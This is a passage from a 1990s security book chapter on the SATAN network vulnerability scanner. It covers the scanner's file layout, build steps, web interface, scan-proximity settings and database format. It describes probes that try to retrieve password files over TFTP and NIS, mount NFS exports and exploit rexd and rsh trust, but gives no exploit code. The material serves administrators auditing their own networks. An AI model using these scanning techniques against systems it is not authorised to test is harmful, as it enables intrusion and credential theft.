many of them invoke the binaries resulting from src/ builds. Each .satan executable generates a
SATAN database record if it finds a piece of information about the remote host.
SATAN refers to each .satan program as a tool. Users can execute each of these PERL scripts
by hand to investigate the particular vulnerabilities. Many of them include verbose (-v) options
to indicate exactly what they are doing. Users who wish to add extra security checks can create
similar files and place them here with the .satan extension.
This directory includes the following files:
n bin/boot.satan: Makes rpc bootparam call to get NIS domainname
n bin/dns.satan: Uses nslookup to gather DNS records on target
n bin/finger.satan: Gathers finger information from target
n bin/ftp.satan: Checks for anonymous FTP and writeable home dir
n bin/nfs-chk.satan: Tries to mount file systems
n bin/rex.satan: Tries to execute program on rexd
n bin/rpc.satan: Gets list from portmap using rpcinfo -p
n bin/rsh.satan: Sees whether + + is in hosts.equiv
n bin/rusers.satan: Gets rusersd to list users
n bin/showmount.satan: Gets mountd to list exports, mounting users
n bin/tcpscan.satan: Tries to connect to list of TCP ports
SATAN and the Internet Inferno 503
n bin/tftp.satan: Tries to get /etc/passwd file
n bin/udpscan.satan: Looks for services on list of UDP ports
n bin/xhost.satan: Sees if remote system permits X access
n bin/ypbind.satan: Tries to guess the NIS domain name
n bin/faux_fping: fping wrapper that skips unresolvable hosts
n bin/get_targets: Uses fping to scan a subnet for live hosts
n bin/yp-chk.satan: Asks NIS server for passwd map
The html Directory
The html directory contains the user interface of SATAN. The PERL scripts generate HTML
pages on-the-fly, whereas the many .html files contain detailed documentation on SATAN. A
regular user of SATAN would never actually examine any of these files by hand, because the
initial SATAN HTML page provides links into each of these pages. They look better when
viewed by a Web browser than by using a text editor. This directory includes the following files:
n html/name.html. Explains the origin of the name “SATAN”
n html/satan.pl. Generates the opening SATAN Web page
n html/satan_documentation.pl. Generates the SATAN documentation Web page
The html/docs Directory
The html/docs directory contains valuable information on the internal workings of SATAN.
The most useful are the satan.rules, satan.probes, satan.db, and trust pages. Once again, the
initial SATAN screen provides links to each of these HTML pages, so it is recommended that
the Web browser be used to read them.
This directory includes the following files (no descriptions are included—the filenames are
self-explanatory):
n html/docs/acknowledgements.html
n html/docs/satan_reference.html
n html/docs/authors.html
n html/docs/copyright.html
n html/docs/design.html
504 Part II: Gaining Access and Securing the Gateway
n html/docs/quotes.html
n html/docs/getting_started.html
n html/docs/intro.html
n html/docs/references.html
n html/docs/system_requirements.html
n html/docs/the_main_parts.html
n html/docs/who_should_use.html
n html/docs/satan.cf.html
n html/docs/artwork.html
n html/docs/dangers.html
n html/docs/FAQ.html
n html/docs/philosophy.html
n html/docs/satan.db.html
n html/docs/satan.probes.html
n html/docs/satan.rules.html
n html/docs/user_interface.html
n html/docs/trust.html
n html/docs/admin_guide_to_cracking.html
n html/docs/satan_overview.html
The html/dots Directory
The html/dots directory contains the colored GIF drawings that are used in the SATAN user
interface. (Again, the filenames are self-explanatory):
n html/dots/blackdot.gif
n html/dots/bluedot.gif
n html/dots/browndot.gif
SATAN and the Internet Inferno 505
n html/dots/dot.gif
n html/dots/eyeball.gif
n html/dots/greendot.gif
n html/dots/orangedot.gif
n html/dots/orig.devil.gif
n html/dots/pinkdot.gif
n html/dots/purpledot.gif
n html/dots/reddot.gif
n html/dots/whitedot.gif
n html/dots/yellowdot.gif
The html/images Directory
The html/images directory contains the GIF drawings displayed by SATAN. (The listings are
self-explanatory, but notice that a GIF of Santa Clause is included to support the top-level
“repent” command that changes all SATAN references to SANTA references, to soothe the
concerns of users who are offended by the SATAN name):
n html/images/satan.gif
n html/images/santa.gif
n html/images/satan-almost-full.gif
n html/images/satan-full.gif
The html/reporting Directory
The html/reporting directory contains PERL scripts that emit HTML pages that provide
summary reports of the vulnerabilities found on targets listed in the SATAN database. The
reports can sort by many categories, as can be seen by the large number of scripts. Note the
one-to-one corresponce between these filenames and the report screens found in the SATAN,
the report “SATAN Information by Subnet” is generated by satan_info_subnet.pl:
n html/reporting/analysis.pl-. Displays the “SATAN Reporting and Analysis” Web
page
n html/reporting/sort_hosts.pl-. Sorts hosts based on specified summary report criteria
506 Part II: Gaining Access and Securing the Gateway
n html/reporting/satan_info_name.pl
n html/reporting/satan_info_subnet.pl
n html/reporting/satan_severity_hosts.pl
n html/reporting/satan_severity_types.pl
n html/reporting/satan_severity_counts.pl
n html/reporting/satan_results_danger.pl
n html/reporting/satan_info_OS.pl
n html/reporting/satan_info_OSclass.pl
n html/reporting/satan_results_subnet.pl
n html/reporting/satan_info_servers.pl
n html/reporting/satan_info_domain.pl
n html/reporting/satan_info_trusting.pl
n html/reporting/satan_info_class.pl
n html/reporting/satan_info_host.pl
n html/reporting/satan_info_OStype.pl
n html/reporting/satan_info_clients.pl
n html/reporting/satan_info_host_action.pl
n html/reporting/satan_results_domain.pl
n html/reporting/satan_info_trusted.pl
n html/reporting/satan_results_trusted.pl
n html/reporting/satan_results_trusting.pl
The html/running Directory
The html/running directory contains the two PERL scripts that begin and control the SATAN
scans:
n html/running/satan_run_form.pl. Runs in response to the selection of SATAN
Target Selection from the SATAN Control Panel
SATAN and the Internet Inferno 507
n html/running/satan_run_action.pl. Executes the SATAN scan and collects the data
when the previous SATAN Run Form screen’s Start the scan field is selected
The html/tutorials Directory
The html/tutorials directory contains useful Web pages for understanding SATAN and the
vulnerabilities that SATAN finds (the filenames are self-explanatory):
n html/tutorials/vulnerability_tutorials.pl
n html/tutorials/first_time/analyzing.html
n html/tutorials/first_time/learning_to_use.html
n html/tutorials/first_time/make.html
n html/tutorials/first_time/scanning.html
The html/tutorials/vulnerability Directory
The html/tutorials/vulnerability directory contains Web page tutorial help on each of the
vulnerabilities searched for by SATAN, including links to appropriate resources that offer more
information:
n html/tutorials/vulnerability/-NFS_export_to_unprivileged_programs.html
n html/tutorials/vulnerability/-NFS_export_via_portmapper.html
n html/tutorials/vulnerability/NIS_password_file_access.html
n html/tutorials/vulnerability/REXD_access.html
n html/tutorials/vulnerability/TFTP_file_access.html
n html/tutorials/vulnerability/remote_shell_access.html
n html/tutorials/vulnerability/unrestricted_NFS_export.html
n html/tutorials/vulnerability/-unrestricted_X_server_access.html
n html/tutorials/vulnerability/-writable_FTP_home_directory.html
n html/tutorials/vulnerability/Sendmail_vulnerabilities.html
n html/tutorials/vulnerability/FTP_vulnerabilities.html
n html/tutorials/vulnerability/unrestricted_modem.html
n html/tutorials/vulnerability/-SATAN_password_disclosure.html
508 Part II: Gaining Access and Securing the Gateway
The html/admin Directory
The html/admin directory contains the PERL scripts that permit a user to dynamically
configure the satan.cf settings from the Web browser, without having to manually edit the
config/satan.cf file. The files in this directory create the SATAN Configuration Management
screen and execute configuration changes requested from that screen:
n html/admin/satan_cf_form.pl. Displays the SATAN Configuration Management
Web page
n html/admin/satan_cf_action.pl. Executes the changes indicated by the SATAN
Configuration Management Web page, and displays the results of the status of those
requested changes
The html/data Directory
The html/data directory contains the PERL scripts that a user invokes to examine or manipulate
existing SATAN databases. SATAN stores the results of scans into databases using a
standard database record format. These text databases can be merged together or opened for
the generation of reports. The files in this directory create the SATAN Data Management
screen and execute the actions requested from that screen:
n html/data/satan_data_form.pl. Displays the SATAN Data Management Web page
n html/data/satan_merge_action.pl. Opens the requested SATAN database and
merges it with another.
n html/data/satan_open_action.pl. Opens the requested SATAN database
The src Directory
The src directory contains C source for several utility programs. These are written in C for
increased speed and compatibility. The top-level make will invoke makes in each of these
directories, which will deposit the executable in the bin directory.
The src/boot Directory
The boot program generates an rpc call to the target system requesting the BOOTPARAM
service to get the NIS domain name. As defined by the rules files, this program is invoked by
boot.satan only if the remote portmap listing indicates the bootparam service:
n src/boot/Makefile. Makes the boot program
n src/boot/boot.c. Contains the boot client program
n src/boot/bootparam_prot.x. rpcgen uses this .x file to generate the RPC stubs to
support boot.c
SATAN and the Internet Inferno 509
The src/misc Directory
The md5 program is used to generate a quasi-random 32-bit number that acts as a password.
The html.pl server accepts only URL requests that include this value; this constitutes a sort of
magic cookie security system. The rex program makes a simple request to the remote rexd to
prove that access is possible. The rcmd program merely invokes the rcmd() call with the
indicated parameters, namely the remote program to execute and the name of the remote
system. The safe_finger program is a version of finger that prevents returning fingerd information
from causing harm. Finally, the timeout program allows a user to run a command for a
limited time.
This directory includes the following files:
n src/misc/Makefile. Makes all the file in this directory
n src/misc/global.h. Contains md5 header information
n src/misc/md5.c. Generates the 32 bit hash value that is used by SATAN as a password
n src/misc/md5.h. Contains include info for md5.c
n src/misc/md5c.c. Contains support code for md5.c
n src/misc/rex.c. Makes a simple request to rexd to prove that access is possible
n src/misc/timeout.c. Executes a command-line specified program with the commandline
specified timeout
n src/misc/rex.x. Generates the RPC stub programs for rex.c
n src/misc/sys_socket.c. Replaces PERL’s socket.ph
n src/misc/rcmd.c. Executes the rcmd() call with the indicated parameters (acts like rsh/
remsh replacement)
n src/misc/safe_finger.c. Protects the client system from dangers involved in running
finger directly (a complete list of the precautions is included in the file)
The src/nfs-chk Directory
The src/nfs-chk directory contains the source for the nfs-chk binary, which attempts to mount
an indicated file system from a particular server. This directory includes the following files:
n src/nfs-chk/Makefile
n src/nfs-chk/mount.x
n src/nfs-chk/nfs-chk.c
n src/nfs-chk/nfs_prot.x
510 Part II: Gaining Access and Securing the Gateway
The src/port_scan Directory
The src/port_scan directory contains the source for the tcp_scan and udp_scan programs.
These two programs scan an indicated target over an indicated range of ports by attempting to
connect to the ports on the target. This directory includes the following files:
n src/port_scan/README
n src/port_scan/error.c
n src/port_scan/find_addr.c
n src/port_scan/lib.h
n src/port_scan/strerror.c
n src/port_scan/mallocs.c
n src/port_scan/non_blocking.c
n src/port_scan/open_limit.c
n src/port_scan/print_data.c
n src/port_scan/ring.c
n src/port_scan/tcp_scan.1
n src/port_scan/tcp_scan.c
n src/port_scan/udp_scan.c
n src/port_scan/Makefile
The src/fping Directory
The src/fping directory contains the source for the fping program. This program is a replacement
for the standard ping program and features the capability to more quickly scan a number
of remote hosts to determine whether these hosts are alive.
This directory includes the following files:
n src/fping/README
n src/fping/CHANGES
n src/fping/fping.c
SATAN and the Internet Inferno 511
n src/fping/fping.man
n src/fping/Makefile
n src/fping/README.VMS
n src/fping/AUTHOR
The src/rpcgen Directory
The src/rpcgen contains the source for the rpcgen program, a utility created by Sun that creates
rpc stub files based on an .x file. The rpcgen utility is shipped on many systems, but SATAN
requires it to run, so the creators of SATAN included the source, just in case. The rpcgen
program is used to compile the nfs-chk, boot, rex, and yp-chk programs.
This directory includes the following files:
n src/rpcgen/Makefile
n src/rpcgen/rpc_clntout.c
n src/rpcgen/rpc_cout.c
n src/rpcgen/rpc_hout.c
n src/rpcgen/rpc_main.c
n src/rpcgen/rpc_parse.c
n src/rpcgen/rpc_parse.h
n src/rpcgen/rpc_scan.c
n src/rpcgen/rpc_scan.h
n src/rpcgen/rpc_svcout.c
n src/rpcgen/rpc_util.c
n src/rpcgen/rpc_util.h
n src/rpcgen/README
The src/yp-chk Directory
The src/yp-chk directory contains the source for the NIS probe. The yp-chk program attempts
to see if an NIS map is available and prints the first record of that map if it is available.
512 Part II: Gaining Access and Securing the Gateway
This directory includes the following files:
n src/yp-chk/Makefile
n src/yp-chk/yp.x
n src/yp-chk/yp-chk.c
The perl Directory
The PERL directory contains the heart of the utilities that make up the SATAN program.
Notice that the html.pl program acts as SATAN’s Web daemon, listening on a TCP port,
authenticating HTML page requests, and responding with the appropriate HTML page.
This directory includes the following files:
n perl/config.pl. Rewrites the satan.cf file based on changes made through the Web
interface
n perl/cops2satan.pl. Converts COPS warning report into SATAN rules (this is
experminental and not accessible from the Web interface)
n perl/domains.pl. Sifts information by domain names
n perl/drop_fact.pl. Applies rules from drop file
n perl/facts.pl. Processes facts
n perl/fix_hostname.pl. Fixes truncated fully qualified domain names
n perl/get_host.pl. Uses gethostbyaddr() or gethostbyname() to find the fully qualified
domain name of a host
n perl/getfqdn.pl. Uses nslookup to find the fully qualified domain name of a host
n perl/hostname.pl. Finds own hostname
n perl/hosttype.pl. Classifies host by banner info
n perl/html.pl. Acts as HTML server with md5 authentication (this is the SATAN Web
daemon)
n perl/infer_facts.pl. Generates new facts based on rules
n perl/infer_todo.pl. Generates list of new targets based on todo information
n perl/misc.pl. Contains utility subroutines
SATAN and the Internet Inferno 513
n perl/policy-engine.pl. Guides the selection of targets according to policies set in the
configuration file
n perl/reconfig.pl. Replaces program names in SATAN with pathnames indicated in
file.paths
n perl/run-satan.pl. Sets up list of targets, executes scans against targets, collects facts,
processes todo information, and saves data
n perl/satan-data.pl. Includes data management routines
n perl/services.pl. Classifies host by services used and provided
n perl/severities.pl. Classifies vulnerabilities
n perl/shell.pl. Runs a command and uses a timeout to ensure that it finishes
n perl/socket.pl. Executes sys_socket binary
n perl/subnets.pl. Sifts subnet information
n perl/suser.pl. Checks if SATAN is running as root
n perl/targets.pl. Generates target lists, executes target probes, and saves scan information
n perl/todo.pl. Stores and processes information about hosts discovered while scanning a
target
n perl/trust.pl. Maintains trust statistics
n perl/status.pl. Maintains time, date, and status file
Note PERL 5.000 (or later) is required to run SATAN. PERL 5.000 is available from any
FTP archive that mirrors the gnu distributions, including the following:
ftp://archive.cis.ohio-state.edu/pub/gnu/mirror/perl5.001.tar.gz.
Building SATAN
Even though SATAN consists of a large number PERL, C, and HTML files, building SATAN
is quite straightforward and quick. Considering the flexibility of SATAN’s modular design, the
ease of use of SATAN’s user interface, and the powerful functionality, SATAN is extremely
easy to build. (SATAN’s only possible weakness could be its speed—as a result of the large
number of PERL scripts and modularity, SATAN is not as fast as a comparable monolithic
binary.)
514 Part II: Gaining Access and Securing the Gateway
Note that building SATAN basically consists of modifying pathnames to correspond to your
system, and compiling the few binary utilities. The entire process takes only a few minutes.
Follow these steps to build SATAN:
1. Edit the paths.pl and paths.sh files in config/ to point to the actual location of utilities on
your system.
2. Edit the config/satan.cf file to correspond to your requirements. Specifically, you should
consider adding entries to $only_attack_these and $dont_attack_these. These two
variables provide control over what hosts are included in SATAN scans. For example, you
might want to run scans only against systems inside notreal.com, so you would use the
$only_attack_these variable to limit the scans to hosts inside the notreal.com domain.
Note You can make modifications to satan.cf from within SATAN using the SATAN
Configuration Management screen.
3. Run the reconfig script. It patches scripts with the path for PERL 5.00x and a Web
browser. If the Web browser selected by reconfig is inappropriate, edit the config/paths.pl
file to point to the Web browser of choice. Notice that the variable for a Web browser is
called $MOSAIC.
4. Run the make command in the satan-1.1.1/ directory. You need to specify a system type,
such as irix5.
5. The authors of SATAN recommend that you unset proxy environment variables or
browser proxy settings.
6. su or log in to root.
7. Run the satan script. If no command-line arguments are given, the script invokes a small
Web (HTML) server, html.pl, and the Web browser to talk to this HTML server.
At this point, the primary SATAN screen is displayed and you are ready to use SATAN.
To use SATAN from the command line, you must list command-line arguments as indicated
by the satan.8 man page. Note that the authors recommend against using the command-line
version of SATAN, because the user interface involves many command-line arguments that can
be somewhat confusing. The Web interface is much easier to use.
Using SATAN’s HTML Interface
The interactive version of SATAN consists of a sequence of HTML pages that are viewed
through the Web browser. The general structure consists of a control panel that leads to five
different functional areas: data management, target selection, reporting and analysis,
SATAN and the Internet Inferno 515
configuration management, and documentation. Most screens give a link back to the SATAN
Control Panel.
The Control Panel
The SATAN Control Panel is your primary control menu for using SATAN (see fig. 8.1).
There you find links to HTML pages that enable you to do the following:
n Manage the data gathered by SATAN
n Choose target systems and run scans
n Generate reports and analyze data
n Modify the default configuration for searches
n Gain access to SATAN’s documentation and tutorials
Figure 8.1
The SATAN Control
Panel.
In addition to the major options listed, a few links permit the user to FTP the latest version of
SATAN from a Dutch FTP archive, to change the name of the program to SANTA (if the
name SATAN offends you), to find information about the artwork in the program, and to find
information about the authors of the program.
516 Part II: Gaining Access and Securing the Gateway
Data Management
Each SATAN scan of a target system generates a series of database records that are stored in
a database file. The default name of the database file is satan-data. For maintaining large
amounts of data, SATAN enables you to specify the name of the database file. If you choose
the SATAN Data Management option from the SATAN Control Panel, your Web browser
displays the screen shown in figure 8.2. The screen shows you the names of the existing
databases and enables you to do the following:
n Open an existing database.
n Create a new database.
n Merge current data with an existing database.
Figure 8.2
The SATAN Data
Management screen.
Notice that the URL in the Location field of figure 8.2 includes a TCP port number and a
32-byte value. The port number corresponds to the port that the SATAN HTML daemon
(html.pl) is listening on, and the 32-byte value is the password that permits access. The
password is generated by an md5 hash function and should be unique to your system.
SATAN and the Internet Inferno 517
Target Selection
When you are ready to run a SATAN scan, choose the SATAN Target Selection option on the
SATAN Control Panel. By selecting that option, you are first presented with the screen shown
in figure 8.3—the SATAN Target Selection screen. From here, you can specify the following:
n The name of the system to scan (that is, cat.cup.hp.com)
n Whether SATAN should scan all hosts on the same subnet
n The level of the scan (light, normal, or heavy)
Figure 8.3
The SATAN Target
Selection screen.
After specifying this information, you can now initiate the scan. As the scan proceeds, you see
the name of each component scan program (mostly .satan scripts) being executed, along with
parameters, on the SATAN Data Collection screen shown in figure 8.4. Note that each
component scan program is invoked using the timeout program. This timeout program acts as
a wrapper around the actual program, using the first argument as the maximum number of
seconds that the program is permitted to run before the timeout causes the program to execute.
The signal that the timeout program sends, and the timeout values, can be configured using
the satan.cf file or the SATAN Configuration Management screen. Notice from figure 8.4 that
the scan of this single host took about 38 seconds.
518 Part II: Gaining Access and Securing the Gateway
After the scan completes, you can select the View Primary Target Results option from the
SATAN Data Collection screen to get to the SATAN Results screen, shown in figure 8.5. The
SATAN Results screen provides a summary of information about the host, as well as a list of
vulnerability information. These results are based on the database records generated by the scan.
Reporting and Data Analysis
After running scans on several hosts, you might want to generate reports or analyze the data
from multiple hosts. By choosing the SATAN Reporting & Data Analysis option from the
SATAN Control Panel, you are presented with the screen shown in figure 8.6. From this
SATAN Reporting and Analysis screen, you can generate reports on all the scan results by the
following criteria:
n Approximate danger level
n Type of vulnerability
n Vulnerability count
n Class of service
n System type
n Internet domain
Figure 8.4
The SATAN Data
Collection screen.
SATAN and the Internet Inferno 519
Figure 8.5
The SATAN Results
screen.
Figure 8.6
The SATAN Reporting
and Analysis screen.
520 Part II: Gaining Access and Securing the Gateway
n Subnet
n Host name
You can also generate a list of trusted hosts and trusting hosts. By selecting the By Type of
Vulnerability option on the SATAN Reporting and Analysis screen, you get the SATAN
Vulnerabilities - By Type report shown in figure 8.7. This screen is very useful if you are trying
to eliminate security problems of a certain type. For example, if you thought that hackers were
actively attacking systems running rexd, this screen would be very useful in helping you to
determine the scope of the problem.
Figure 8.7
The SATAN
Vulnerabilities - By Type
report.
Configuration Management
By choosing the SATAN Configuration Management option from the SATAN Control Panel,
you can modify the configuration set in satan.cf. Using the screens shown in figures 8.8 and
8.9, you can modify the following parameters:
n The directory to keep the data in
n The default probe level
n The timeout value for each network probe
n The kill signal sent to tool processes at timeout
n The maximum proximity amount (maximal proximity)
n The proximity descent value
n Whether to stop when the probe level hits 0
n Whether to scan the entire subnet of the target
n Whether the intruder system is trusted
SATAN and the Internet Inferno 521
n Limits on what hosts to probe (by domain name or subnet address)
n Limits on what hosts cannot be probed
n Two workarounds: one tells SATAN to use nslookup (for NIS environments) or
gethostbyname() lookups (for DNS environments), and one that tells SATAN to use or
not use ping (because ping depends on ICMP, environments where ICMP does not
work will want to avoid ICMP—not many systems fall into this category).
Figure 8.8
The SATAN Configuration
Management screen, part 1.
Figure 8.9
The SATAN Configuration
Management screen, part 2.
522 Part II: Gaining Access and Securing the Gateway
The proximity settings deserve comment. SATAN treats any host information gained from a
scan of a single target system as having a proximity of 1 to the target system. This means that
the name servers, MX mail hosts that receive mail for this system, NFS clients, and hosts listed
in the .rhosts/hosts.equiv files are all considered to have a proximity of 1 to the target. If you
scan with a maximal proximity setting of 2, the number of hosts scanned can become quite
large. SATAN scans the target, then scans all hosts that have a proximity of 1 to the target, and
then scans all hosts that have a proximity of 1 to the hosts that have a proximity of 1 to the
target. You can imagine the exponential growth involved with SATAN scans that use a
maximal proximity setting greater than 2. When the maximal proximity field is set to 0,
SATAN scans only the target system, and possibly the target’s subnet.
The proximity descent field can be used to decrease the intensity of the scan as SATAN moves
the scan out to less proximate hosts. For example, consider a situation where the maximal
proximity field is set to 2, the proximity descent field is set to 1, and the probe level starts at
heavy. The target is scanned at the heavy level, the hosts at proximity of 1 are scanned at the
normal level, and the hosts at proximity of 2 are scanned at the light level.
If you specify a subnet expansion, SATAN scans every host with an IP address whose first three
parts match the target. For example, if the target was 192.12.13.14, SATAN would scan every
host in the IP range 192.12.13.1 to 192.12.13.254. (Note that x.x.x.0 and x.x.x.255 are
typically reserved for broadcast and are not assigned to individual hosts.)
Documentation
Selecting the SATAN Documentation option from the SATAN Control Panel brings up an
index into SATAN’s extensive online documentation, as shown in figure 8.10. Detailed
information on SATAN and network vulnerabilities is available.
Figure 8.10
The SATAN
Documentation index.
SATAN and the Internet Inferno 523
The following are the three most useful parts of the documentation:
n SATAN Reference
n Vulnerabilities Tutorials
n Admin Guide to Cracking
The SATAN Reference provides detailed information about SATAN, the database records, and
the inference engine. SATAN includes tutorials on the 13 network vulnerabilities included in
its scans. If you choose the “Vulnerabilities - a Tutorial” option from the SATAN Documentation
screen, SATAN brings up the list of these tutorials, as shown in figure 8.11.
Figure 8.11
The SATAN Tutorials
Security problems
Choosing an entry from the Vulnerabilities screen brings up a tutorial that includes tips on
addressing the problem and Web links to programs and information regarding the problem.
For example, if you choose the Remote Shell Access option from the Vulnerabilities screen,
SATAN brings up the Remote Shell Access screen shown in figure 8.12.
Note that many of the tutorial screens, such as the one shown in figure 8.12, provide a link to
the seminal paper “Improving the Security of Your Site by Breaking Into It” (Farmer &
Venema, 1993). This influential document was written by the authors of SATAN and led to
the creation of SATAN. The entire goal of SATAN was to automate the process described in
the paper. If you select the Admin Guide to Cracking option from the Remote Shell Access
screen, SATAN brings up the paper, as shown in figure 8.13.
524 Part II: Gaining Access and Securing the Gateway
Running a Scan
Follow these steps to run a scan:
1. Start your SATAN scan from the SATAN Control Panel screen, as shown in figure 8.1.
Figure 8.12
The Remote Shell Access
tutorial.
Figure 8.13
SATAN’s Admin Guide to
Cracking.
SATAN and the Internet Inferno 525
2. Select the SATAN Configuration Management option and modify the settings as
discussed previously.
For a scan of a single target system, just make sure that the maximal proximity is set to 0
and that subnet expansion is turned off.
3. Return to the SATAN Control Panel by selecting the Change the Configuration File
option to save any changes.
4. Choose the SATAN Target Selection option and type the name of the target system into
the field on the SATAN Target Selection screen.
5. Select the scan level and start the scan.
6. After the SATAN data collection is complete, select the View Primary Target Results
option from the SATAN Data Collection screen.
You have now completed the SATAN scan. If you are running a scan against a subnet, you
have a maximal proximity setting greater than 1, or you have scanned several hosts, your
database information might grow large. To generate reports that help you sort this data, choose
the SATAN Reporting & Data Analysis option from the SATAN Control Panel. From the
SATAN Reporting and Analysis screen, you can select reports that help to sort the information
on all the database records.
Understanding the SATAN Database Record Format
There are three types of database records: facts, all-hosts, and todo. These database records
are stored in three different files: facts, all-hosts, and todo. These files are typically in a
subdirectory of satan called results/satan-data. The subdirectory of results corresponds to the
name of the SATAN database, with the default being satan-data.
The facts file contains the results of vulnerability scans; each record of this file is called a fact.
SATAN attempts to build a database of host information in the all-hosts file, which contains
host name information, regardless of whether SATAN scanned those hosts. The todo file keeps
track of which probes have been run against a target.
Looking at the Facts
Each .satan script (program) is required to output text records that are directly stored into the
facts database file. Each text record consists of eight fields, each separated by a pipe (|) character.
Newlines separate entries in this file. Each SATAN fact starts with a $target field and ends
with a $text field. The rulesets use PERL search capabilities to match against records from the
facts file. SATAN rulesets are described in detail later in this chapter in a section called
“Understanding the SATAN Rulesets.”
526 Part II: Gaining Access and Securing the Gateway
Each SATAN fact consist of the following eight fields:
n Target
n Service
n Status
n Severity
n Trusted
n Trustee
n Canonical service output
n Text
Target ($target)
This is the name of the host that the record refers to. SATAN tries to put the fully qualified
domain name into this field, but if it cannot, it uses the IP address. If that fails, it uses an
estimated name or partial name.
Service ($service)
This is the name of the tool with the .satan suffix removed. If a tool does more than one scan,
such as rpc.satan, this is the name of the service probed.
Status ($status)
This is a one-character field that indicates the status of the target host, as follows:
Field Description
a Indicates that the target was available
u Indicates that it was unavailable
b Indicates that the target name could not be resolved to an IP address and
was therefore a bad name
x Is used for other cases (reserved for future use)
Severity ($severity)
This is a two-character field that indicates the estimated severity of the vulnerability:
SATAN and the Internet Inferno 527
